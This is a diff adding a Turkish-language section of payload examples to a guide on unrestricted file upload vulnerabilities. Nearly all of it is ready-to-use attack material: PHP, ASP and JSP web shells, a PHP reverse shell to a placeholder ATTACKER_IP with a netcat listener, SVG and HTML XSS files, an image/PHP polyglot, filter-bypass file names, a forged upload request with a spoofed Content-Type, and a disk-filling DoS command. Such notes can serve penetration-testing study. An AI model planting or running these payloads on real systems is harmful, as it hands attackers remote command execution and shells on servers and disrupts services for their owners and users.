@@ -198,3 +198,154 @@ Kurban SVG dosyasını açtığında tarayıcıda XSS tetiklenir.
 📌 Özet:  
 Unrestricted File Upload açıkları sadece **sunucu tarafı RCE** için değil, aynı zamanda **istemci tarafı XSS**, **malware yayma**, **defacement**, **DoS** gibi birçok saldırı senaryosuna kapı aralar.  
 
+---
+## 🛠️ Payload Örnekleri
+
+Dosya yükleme açıklarının istismarında kullanılan payloadlar, saldırganın amacına göre değişiklik gösterir. Aşağıda en yaygın kullanılan örnekler listelenmiştir.  
+
+---
+
+### 1. Basit Web Shell Payload (PHP)
+<?php system($_GET['cmd']); ?>
+
+**Kullanım:**
+http://hedefsite.com/uploads/shell.php?cmd=whoami  
+
+**Sonuç:**
+Sunucu üzerinde komut çalıştırılır.  
+
+---
+
+### 2. Reverse Shell Payload (PHP)
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
+?>
+
+**Kullanım:**
+- Saldırgan kendi makinesinde `nc -lvnp 4444` ile dinleme yapar.  
+- Yüklenen dosya çalıştırıldığında hedef sunucu saldırgana bağlanır.  
+
+**Sonuç:**
+Hedef sistemin kabuğu saldırganın eline geçer.  
+
+---
+
+### 3. ASP Web Shell
+<%
+Set oShell = CreateObject("WScript.Shell")
+Set oExec = oShell.Exec(Request.QueryString("cmd"))
+Response.Write(oExec.StdOut.ReadAll())
+%>
+
+**Kullanım:**
+http://hedefsite.com/uploads/shell.asp?cmd=whoami  
+
+**Sonuç:**
+Windows tabanlı sunucuda komut çalıştırma.  
+
+---
+
+### 4. JSP Web Shell
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+String output = "";
+try {
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while ((line = reader.readLine()) != null) { output += line + "\n"; }
+} catch(Exception e) { output += e.toString(); }
+out.println(output);
+%>
+
+**Kullanım:**
+http://hedefsite.com/uploads/shell.jsp?cmd=whoami  
+
+**Sonuç:**
+Java tabanlı uygulamalarda RCE elde edilir.  
+
+---
+
+### 5. HTML Dosyası ile XSS
+<html><body><script>alert('File Upload XSS')</script></body></html>
+
+**Kullanım:**
+http://hedefsite.com/uploads/xss.html  
+
+**Sonuç:**
+Tarayıcıda XSS tetiklenir.  
+
+---
+
+### 6. SVG Payload (XSS)
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('SVG XSS')"></svg>
+
+**Kullanım:**
+http://hedefsite.com/uploads/evil.svg  
+
+**Sonuç:**
+SVG dosyası açıldığında XSS çalışır.  
+
+---
+
+### 7. Polyglot Dosya (Hem Resim Hem PHP)
+GIF89a
+<?php system($_GET['cmd']); ?>
+
+**Kullanım:**
+Dosya `shell.jpg.php` gibi çift uzantılı yüklenir.  
+
+**Sonuç:**
+Hem resim gibi görünür hem de sunucu tarafından PHP olarak yorumlanır.  
+
+---
+
+### 8. Double Extension Payload
+shell.php.jpg  
+shell.jpg.php  
+
+**Kullanım:**
+Filtrelerin sadece ilk veya son uzantıyı kontrol etmesi durumunda yüklenebilir.  
+
+**Sonuç:**
+Zararlı dosya filtreyi bypass ederek yüklenir.  
+
+---
+
+### 9. MIME Type Manipülasyonu
+HTTP isteğinde Content-Type değiştirilir.  
+
+POST /upload HTTP/1.1  
+Content-Type: image/png  
+Content-Disposition: form-data; name="file"; filename="shell.php"  
+
+<?php system($_GET['cmd']); ?>
+
+**Kullanım:**
+Sunucu sadece Content-Type headerına bakarsa PHP dosyası kabul edilir.  
+
+**Sonuç:**
+Zararlı script çalıştırılır.  
+
+---
+
+### 10. Büyük Dosya Payload (DoS)
+Fuzzer veya `dd` komutu ile GB’larca boş dosya oluşturulup yüklenir.  
+
+dd if=/dev/zero of=bigfile.txt bs=1M count=5000  
+
+**Kullanım:**
+bigfile.txt yüklenir.  
+
+**Sonuç:**
+Disk alanı dolar, servis kesintisi (DoS) oluşur.  
+
+---
+
+📌 Özet:  
+Payload seçimi hedef platforma (PHP, ASP, JSP) ve güvenlik kontrollerine (uzantı filtresi, MIME doğrulama, içerik analizi) bağlıdır.  
+
+---
+
+
